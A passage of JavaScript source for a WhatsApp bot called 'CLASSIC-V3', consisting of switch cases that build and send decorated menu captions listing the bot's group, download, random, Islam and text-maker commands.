  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
  sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
  }}
  }
zetsubo.sendMessage(from, hiks, {quoted: zets })}
break
case 'pushmenu': {

                            ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━
┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 Tarlife ❵
┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
┃
┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
┃
┃    📚𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃*.
┃	👾𝐏𝐫𝐞𝐟𝐢𝐱 : *𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱*.
┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
┃
┣━━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━━
┃
┃┏━━━━━━━━━━━━━━━━━━━
┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦𝐢𝐮𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐥𝐢𝐬𝐭𝐩𝐫𝐞𝐦
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐚𝐝𝐝 (628𝐱𝐱)
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐝𝐞𝐥 (628𝐱𝐱)
┃➢ 𝐥𝐢𝐬𝐭𝐛𝐚𝐧
┃➢ 𝐩𝐮𝐛𝐥𝐢𝐜
┃➢ 𝐬𝐞𝐥𝐟
┃┗━━━━━━━━━━━━━━━━━━━
┃ ➥➥➥➥❴⧠ 𝗕𝗬 Tarlife ⧠❵➥➥➥➥
┣━━━━━━━━━━━━━━━━━━━━
┣━━━━━━━━━❴ 𝗣𝘂𝘀𝗵 ❵━━━━━━━
┃
┃┏━━━━━❴ 𝐋𝐈𝐒𝐓𝐌𝐄𝐍𝐔 ❵━━━━━━
┃➟ 𝐒𝐚𝐯𝐞𝐤𝐨𝐧𝐭𝐚𝐤𝐢𝐝 𝐢𝐝𝐠𝐜
┃➟ 𝐒𝐚𝐯𝐞𝐤𝐨𝐧𝐭𝐚𝐤 (𝐆𝐫𝐨𝐮𝐩 𝐕𝐜𝐟 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐬𝐞𝐧𝐭)
┃➟ 𝐩𝐮𝐬𝐡𝐜𝐨𝐧𝐭𝐢𝐝 (𝐆𝐜 𝐋𝐢𝐧𝐤)
┃➟ 𝐩𝐮𝐬𝐡𝐤𝐨𝐧𝐭𝐚𝐤 𝐭𝐞𝐤𝐬 (𝐬𝐞𝐧𝐭 𝐭𝐨 𝐆𝐂)
┃
┃┗━━━━━━━━━━━━━━━━━━━━
┃ ➥➥❴ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024* ❵➥➥
┗━━━━━━━━━━━━━━━━━━━━━  
`
let hiks = {
image: cewegw, 
  caption: ewe,
  contextInfo:{externalAdReply:{
  title: '⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺',
  body: '⫹⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⫺ᚖ𝑴𝒊𝑺𝑺𝒊𝒐𝑵ᚘᚙ', 
  showAdAttribution: true,
  thumbnail:hinachan,
  mediaType: 4,
  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
  sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
  }}
  }
zetsubo.sendMessage(from, hiks, {quoted: zets })}
break
//=================================================//
case 'groupmenu': {

                            ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━
┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 Tarlife ❵
┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
┃
┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
┃
┃    📚𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃*.
┃	👾𝐏𝐫𝐞𝐟𝐢𝐱 : *𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱*.
┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
┃
┣━━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━━
┃
┃┏━━━━━━━━━━━━━━━━━━━
┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦𝐢𝐮𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐥𝐢𝐬𝐭𝐩𝐫𝐞𝐦
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐚𝐝𝐝 (628𝐱𝐱)
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐝𝐞𝐥 (628𝐱𝐱)
┃➢ 𝐥𝐢𝐬𝐭𝐛𝐚𝐧
┃➢ 𝐩𝐮𝐛𝐥𝐢𝐜
┃➢ 𝐬𝐞𝐥𝐟
┃┗━━━━━━━━━━━━━━━━━
┣━━━━━━━❴ GROUPMENU ❵━━━━━
┃  ➥➥❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024* ❱➥➥
┣━━━━━━━━━━━━━━━━━━
┃➟ 𝖜𝖊𝖑𝖈𝖔𝖒𝖊 𝖔𝖓 / 𝖔𝖋𝖋
┃➟ 𝖆𝖓𝖙𝖎𝖑𝖎𝖓𝖐 𝖔𝖓 / 𝖔𝖋𝖋
┃➟ 𝖆𝖓𝖙𝖎𝖙𝖔𝖝𝖎𝖈 𝖔𝖓 / 𝖔𝖋𝖋
┃➟ 𝖇𝖈𝖌𝖈 (𝖙𝖊𝖝𝖙𝖓𝖞𝖆)
┃➟ 𝖔𝖕𝖊𝖓𝖆𝖎 (𝖙𝖊𝖝𝖙𝖓𝖞𝖆)
┃➟ 𝖍𝖎𝖉𝖊𝖙𝖆𝖌 (𝖙𝖊𝖝𝖙𝖓𝖞𝖆)
┃➟ 𝖐𝖎𝖈𝖐 (628𝖝𝖝)
┃➟ 𝖆𝖉𝖉 (628𝖝𝖝)
┃➟ 𝖕𝖗𝖔𝖒𝖔𝖙𝖊 (628𝖝𝖝)
┃➟ 𝖉𝖊𝖒𝖔𝖙𝖊 (628𝖝𝖝)
┃➟ 𝖘𝖊𝖓𝖉𝖑𝖎𝖓𝖐𝖌𝖈 (628𝖝𝖝)
┃➟ 𝖊𝖉𝖎𝖙𝖌𝖗𝖔𝖚𝖕 𝖈𝖑𝖔𝖘𝖊 / 𝖔𝖕𝖊𝖓
┃➟ 𝖊𝖉𝖎𝖙𝖎𝖓𝖋𝖔 𝖔𝖓 / 𝖔𝖋𝖋
┃➟ 𝖏𝖔𝖎𝖓 (𝖑𝖎𝖓𝖐𝖓𝖞𝖆)
┃➟ 𝖊𝖉𝖎𝖙𝖘𝖚𝖇𝖏𝖊𝖐 (𝖙𝖊𝖝𝖙𝖓𝖞𝖆)
┃➟ 𝖊𝖉𝖎𝖙𝖉𝖊𝖘𝖐 (𝖙𝖊𝖝𝖙𝖓𝖞𝖆)
┃➟ 𝖙𝖆𝖌𝖆𝖑𝖑 (𝖙𝖊𝖝𝖙𝖓𝖞𝖆)
┃➟ 𝖎𝖓𝖘𝖕𝖊𝖈𝖙 (𝖑𝖎𝖓𝖐𝖓𝖞𝖆)
│➟ 𝖑𝖎𝖓𝖐𝖌𝖗𝖔𝖚𝖕
┃➟ 𝖗𝖊𝖘𝖊𝖙𝖑𝖎𝖓𝖐𝖌𝖈
┃➟ 𝖕𝖗𝖔𝖒𝖔𝖙𝖊𝖆𝖑𝖑
┃➟ 𝖉𝖊𝖒𝖔𝖙𝖊𝖆𝖑𝖑
┃➟ 𝖑𝖆𝖗𝖆𝖓𝖌𝖆𝖓
┃➟ 𝖛𝖎𝖗𝖌𝖆𝖒
┃➟ 𝖇𝖚𝖆𝖙𝖘𝖜
┃➟𝖇𝖚𝖆𝖙𝖘𝖜𝖎𝖒𝖆𝖌𝖊
┃➟ 𝖇𝖚𝖆𝖙𝖘𝖜𝖛𝖎𝖉𝖊𝖔
┃➟ 𝖘𝖜𝖎𝖓
┃➟ 𝖛𝖓𝖘𝖜
┃➟ 𝖇𝖚𝖆𝖙𝖘𝖜𝖕𝖙𝖛
┃➟➟𝖙𝖔𝖕𝖙𝖛
┃➟ 𝖇𝖚𝖆𝖙𝖘𝖜
┣━━━━━━━━━━━━━━━━━━━━
┃  ➥➥❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024* ❱➥➥
┗━━━━━━━━━━━━━━━━━━━━
`
let hiks = {
image: cewegw, 
  caption: ewe,
  contextInfo:{externalAdReply:{
  title: '𒑰⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺⿻',
  body: '༐༑⿻⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⿻༔༐༑', 
  showAdAttribution: true,
  thumbnail:hinachan,
  mediaType: 4,
  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
  sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
  }}
  }
zetsubo.sendMessage(from, hiks, {quoted: zets })}
break
//=================================================//
case 'downloadmenu': {

                            ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━
┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
┃
┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
┃
┃    📚𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃*.
┃	👾𝐏𝐫𝐞𝐟𝐢𝐱 : *𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱*.
┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
┃
┣━━━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━
┃
┃┏━━━━━━━━━━━━━━━━━
┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦𝐢𝐮𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐥𝐢𝐬𝐭𝐩𝐫𝐞𝐦
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐚𝐝𝐝 (628𝐱𝐱)
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐝𝐞𝐥 (628𝐱𝐱)
┃➢ 𝐥𝐢𝐬𝐭𝐛𝐚𝐧
┃➢ 𝐩𝐮𝐛𝐥𝐢𝐜
┃➢ 𝐬𝐞𝐥𝐟
┃┗━━━━━━━━━━━━━━━━━━
┣━━━━❰ DOWNLOAD ❱━━━━
┃
┃┏━❰ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔 ❱━━
┃➟ 𝐟𝐛𝐯𝐢𝐝𝐞𝐨 (𝐥𝐢𝐧𝐤)
┃➟ 𝐟𝐛𝐫𝐞𝐞𝐥𝐬 (𝐥𝐢𝐧𝐤)
┃➟ 𝐢𝐠𝐯𝐢𝐝𝐞𝐨 (𝐥𝐢𝐧𝐤)
┃➟ 𝐢𝐠𝐫𝐞𝐞𝐥𝐬 (𝐥𝐢𝐧𝐤)
┃➟ 𝐭𝐰𝐢𝐭𝐯𝐢𝐝𝐞𝐨 (𝐥𝐢𝐧𝐤)
┃➟ 𝐭𝐢𝐤𝐭𝐨𝐤𝐯𝐢𝐝𝐞𝐨 (𝐥𝐢𝐧𝐤)
┃➟ 𝐲𝐭𝐦𝐩3 (𝐥𝐢𝐧𝐤)
┃➟ 𝐲𝐭𝐦𝐩4 (𝐥𝐢𝐧𝐤)
┃➟ 𝐲𝐭𝐬𝐞𝐚𝐫𝐜𝐡 (𝐥𝐢𝐧𝐤)
┃➟ 𝐲𝐭𝐫𝐞𝐞𝐥𝐬 (𝐥𝐢𝐧𝐤)
┃➟ 𝐏𝐥𝐚𝐲 
┃➟ 𝐠𝐞𝐭𝐯𝐢𝐝𝐞𝐨 (𝐫𝐞𝐩𝐥𝐲 𝐡𝐚𝐬𝐢𝐥)
┃┗━━━━━━━━━━━━━━━━━━━
┃  ➥➥❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024* ❱➥➥
┗━━━━━━━━━━━━━━━━━━━━
`
let hiks = {
image: cewegw, 
  caption: ewe,
  contextInfo:{externalAdReply:{
  title: '𒑰⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺',
  body: '༐༑⿻⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉⿻༔༐༑', 
  showAdAttribution: true,
  thumbnail:hinachan,
  mediaType: 4,
  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
  sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
  }}
  }
zetsubo.sendMessage(from, hiks, {quoted: zets })}
break
//=================================================//
case 'randommenu': {

                            ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━━
┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
┃
┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
┃
┃    📚𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃*.
┃	👾𝐏𝐫𝐞𝐟𝐢𝐱 : *𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱*.
┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
┃
┣━━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━
┃
┃┏━━━━━━━━━━━━━━━━
┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦𝐢𝐮𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐥𝐢𝐬𝐭𝐩𝐫𝐞𝐦
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐚𝐝𝐝 (628𝐱𝐱)
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐝𝐞𝐥 (628𝐱𝐱)
┃➢ 𝐥𝐢𝐬𝐭𝐛𝐚𝐧
┃➢ 𝐩𝐮𝐛𝐥𝐢𝐜
┃➢ 𝐬𝐞𝐥𝐟
┃┗━━━━━━━━━━━━━━━━
┃
┃━━━━━━━❴ 𝗥𝗮𝗻𝗱𝗼𝗺 ❵━━━━
┃
┃┏━━━━❴ 𝑳𝑰𝑺𝑻 𝑹𝑨𝑵𝑫𝑶𝑴 ❵━━━
┃➟ 𝒐𝒘𝒏𝒆𝒓
┃➟ 𝒔𝒕𝒊𝒄𝒌𝒆𝒓
┃➟𝒏𝒐𝒑𝒆
┃➟ 𝒘𝒎
┃➟ 𝒘𝒎𝒗𝒊𝒅𝒆𝒐
┃➟ 𝒆𝒎𝒐𝒋𝒊𝒎𝒊𝒙
┃➟ 𝒆𝒎𝒐𝒋𝒊𝒎𝒊𝒙2
┃➟ 𝒂𝒕𝒕𝒑 (𝒕𝒆𝒙𝒕𝒏𝒚𝒂)
┃➟ 𝒕𝒕𝒑 (𝒕𝒆𝒙𝒕𝒏𝒚𝒂)
┃➟ 𝒂𝒇𝒌 (𝒕𝒆𝒙𝒕𝒏𝒚𝒂)
┃➟ 𝒈𝒂𝒎𝒃𝒂𝒓 (𝒕𝒆𝒙𝒕𝒏𝒚𝒂)
┃➟ 𝒒𝒖𝒐𝒕𝒆𝒔𝒂𝒏𝒊𝒎𝒆
┃➟ 𝒇𝒂𝒌𝒕𝒂𝒖𝒏𝒊𝒌
┃➟ 𝒌𝒂𝒕𝒂𝒃𝒊𝒋𝒂𝒌
┃➟ 𝒑𝒂𝒏𝒕𝒖𝒏
┃➟ 𝒃𝒖𝒄𝒊𝒏
┃➟ 𝒕𝒐𝒊𝒎𝒂𝒈𝒆
┃➟ 𝒕𝒐𝒎𝒑4
┃➟ 𝒕𝒐𝒎𝒑3
┃➟ 𝒕𝒐𝒂𝒖𝒅
┃➟ 𝒕𝒐𝒗𝒏
┃➟ 𝒕𝒐𝒂𝒖𝒅𝒊𝒐
┃➟ 𝒕𝒐𝒈𝒊𝒇
┃➟ 𝒕𝒐𝒖𝒓𝒍
┃➟ 𝒔𝒎𝒆𝒎𝒆
┃➟ 𝒒𝒖𝒐𝒕𝒆𝒔
┃➟ 𝒅𝒂𝒓𝒌𝒋𝒐𝒌𝒆𝒔
┃➟ 𝒈𝒐𝒐𝒈𝒍𝒆
┃➟ 𝒄𝒐𝒖𝒑𝒍𝒆
┃➟ 𝒄𝒐𝒇𝒇𝒆
┃➟ 𝒈𝒆𝒕𝒏𝒂𝒎𝒆
┃➟ 𝒈𝒆𝒕𝒑𝒊𝒄
┃➟ 𝒔𝒆𝒕𝒑𝒑𝒃𝒐𝒕
┃➟ 𝒔𝒆𝒕𝒑𝒑𝒈𝒓𝒐𝒖𝒑
┃➟ 𝒃𝒍𝒐𝒄𝒌
┃➟ 𝒖𝒏𝒃𝒍𝒐𝒄𝒌
┃➟ 𝒔𝒕𝒂𝒍𝒌𝒕𝒊𝒌𝒕𝒐𝒌
┃➟ 𝒊𝒏𝒇𝒐𝒈𝒆𝒎𝒑𝒂
┃➟ 𝒍𝒊𝒓𝒊𝒌
┃➟ 𝒄𝒆𝒓𝒑𝒆𝒏
┃➟ 𝒒𝒄
┃➟ 𝒒𝒄𝒔𝒕𝒊𝒄𝒌
┃➟ 𝒄𝒆𝒓𝒊𝒕𝒂𝒉𝒐𝒓𝒐𝒓
┃➟ 𝒄𝒖𝒂𝒄𝒂
┃┗━━━━━━━━━━━━━━━━━━
┃ ➥➥➥❰*𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024*❱➥➥➥
┗━━━━━━━━━━━━━━━━━━━
`
let hiks = {
image: cewegw, 
  caption: ewe,
  contextInfo:{externalAdReply:{
  title: '𒑰᚜ 𝐇𝐚𝐢𝐥 𝐭𝐨 𝐊𝐢𝐧𝐠 𝐒𝐚𝐦 ᚛⿻',
  body: '༐༑⿻⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺༔༐༑', 
  showAdAttribution: true,
  thumbnail:hinachan,
  mediaType: 4,
  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
  sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
  }}
  }
zetsubo.sendMessage(from, hiks, {quoted: zets })}
break
//=================================================//
case 'Islammenu': {

                            ewe = `┏━━━▓ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 𝗕𝗢𝗧* ▓━━━━━━━
┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
┃
┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
┃
┃    📚𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃*.
┃	👾𝐏𝐫𝐞𝐟𝐢𝐱 : *𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱*.
┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
┃
┣━━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━━
┃
┃┏━━━━━━━━━━━━━━━━━━
┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦𝐢𝐮𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐥𝐢𝐬𝐭𝐩𝐫𝐞𝐦
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐚𝐝𝐝 (628𝐱𝐱)
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐝𝐞𝐥 (628𝐱𝐱)
┃➢ 𝐥𝐢𝐬𝐭𝐛𝐚𝐧
┃➢ 𝐩𝐮𝐛𝐥𝐢𝐜
┃➢ 𝐬𝐞𝐥𝐟
┃┗━━━━━━━━━━━━━━━━━━━
┃━━━━━━「 𝐈𝐒𝐋𝐀𝐌 」━━━━━━━ 
┃
┃┏━━━━━━━ 𝐋𝐈𝐒𝐓 𝐈𝐒𝐋𝐀𝐌━━━━━━━
┃➟ 𝐣𝐚𝐝𝐰𝐚𝐥𝐬𝐡𝐨𝐥𝐚𝐭
┃➟ 𝐤𝐢𝐬𝐚𝐡𝐧𝐚𝐛𝐢
┃➟ 𝐚𝐥𝐪𝐮𝐫𝐚𝐧𝐚𝐮𝐝𝐢𝐨
┃➟ 𝐚𝐬𝐦𝐚𝐮𝐥𝐡𝐮𝐬𝐧𝐚
┃➟ 𝐚𝐥𝐪𝐮𝐫𝐚𝐧
┃➟ 𝐥𝐢𝐬𝐭𝐬𝐮𝐫𝐚𝐡
┃┗━━━━━━━━━━━━━━━━━━━━
┃  ➥➥➥❰*𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3 ®2024*❱➥➥➥
┗━━━━━━━━━━━━━━━━━━━━━`
let hiks = {
image: cewegw, 
  caption: ewe,
  contextInfo:{externalAdReply:{
  title: '𒑰⧉⸙𝐋⚔𝐎᪥𝐑ᚘ𝐃ᚗ𝐒⸙𝐀࿈𝐌⸙⧉',
  body: '⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3⧉⸙⫺', 
  showAdAttribution: true,
  thumbnail:hinachan,
  mediaType: 4,
  MediaUrl:`https://telegra.ph/file/a3b5de3c2cd44f6b3aa80.jpg`,
  sourceUrl:`https://www.instagram.com/ano_nymous_sam?utm_source=qr&igsh=MzNlNGNkZWQ4Mg==`,
  }}
  }
zetsubo.sendMessage(from, hiks, {quoted: zets })}
break
//=================================================//
case 'textmaker': {

                            ewe = `┏━━━❰ *𝗖𝗟𝗔𝗦𝗦𝗜𝗖-𝗩3* ❱━━━━━━ 
┃  ➥𝐒𝐜 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 ❴ 𝐵𝑌 𝑆𝐴𝑀 ❵
┃  ➥ 𝐔𝐬𝐞𝐫 : ${pushname}}
┃  ➥𝐂𝐨𝐧𝐭𝐚𝐜𝐭 : @${m.sender.split('@')[0]}
┃
┣╼╼❴ ⧠ ᏴϴͲ ᏆΝҒϴ ⧠ ❵╼╼╼
┃
┃    📚𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *𝐁𝐚𝐢𝐥𝐞𝐲𝐬-𝐌𝐃*.
┃	👾𝐏𝐫𝐞𝐟𝐢𝐱 : *𝐌𝐮𝐥𝐭𝐢-𝐏𝐫𝐞𝐟𝐢𝐱*.
┃	📅𝐃𝐚𝐭𝐞 𝐒𝐞𝐫𝐯𝐞𝐫 : ${moment.tz('Africa/Nairobi').format('DD/MM/YY')}
┃	🕑𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
┃
┣━━━━━━ 𝗔𝗱𝗱 𝗔𝗰𝗰𝗲𝘀 ━━━━━━
┃
┃┏━━━━━━━━━━━━━━━━━━
┃➢ 𝐚𝐝𝐝𝐩𝐫𝐞𝐦 (628xx/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦𝐢𝐮𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐝𝐞𝐥𝐩𝐫𝐞𝐦 (628𝐱𝐱/@𝐭𝐚𝐠)
┃➢ 𝐥𝐢𝐬𝐭𝐩𝐫𝐞𝐦
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐚𝐝𝐝 (628𝐱𝐱)
┃➢ 𝐩𝐞𝐧𝐠𝐠𝐮𝐧𝐚 𝐝𝐞𝐥 (628𝐱𝐱)
┃➢ 𝐥𝐢𝐬𝐭𝐛𝐚𝐧
┃➢ 𝐩𝐮𝐛𝐥𝐢𝐜
┃➢ 𝐬𝐞𝐥𝐟
┃┗━━━━━━━━━━━━━━━━━━━━
┃
┃━━━━━━「 𝑻𝑬𝑿𝑻𝑴𝑨𝑲𝑬𝑹 」━━━━
┃
┃┏━━━━ 𝑳𝑰𝑺𝑻 𝑻𝑬𝑿𝑻𝑴𝑨𝑲𝑬𝑹 ━━━━
┃➟ 𝒃𝒍𝒂𝒄𝒌𝒑𝒊𝒏𝒌
┃➟ 𝒏𝒆𝒐𝒏
┃➟ 𝒈𝒓𝒆𝒆𝒏𝒏𝒆𝒐𝒏
┃➟ 𝒂𝒅𝒗𝒂𝒏𝒄𝒆𝒈𝒍𝒐𝒘
┃➟ 𝒇𝒖𝒕𝒖𝒓𝒆𝒏𝒆𝒐𝒏
┃➟ 𝒔𝒂𝒏𝒅𝒘𝒓𝒊𝒕𝒊𝒏𝒈
┃➟ 𝒔𝒂𝒏𝒅𝒔𝒖𝒎𝒎𝒆𝒓
┃ 𝒔𝒂𝒏𝒅𝒆𝒏𝒈𝒓𝒂𝒗𝒆𝒅
┃➟ 𝒎𝒆𝒕𝒂𝒍𝒅𝒂𝒓𝒌
┃➟ 𝒏𝒆𝒐𝒏𝒍𝒊𝒈𝒉𝒕
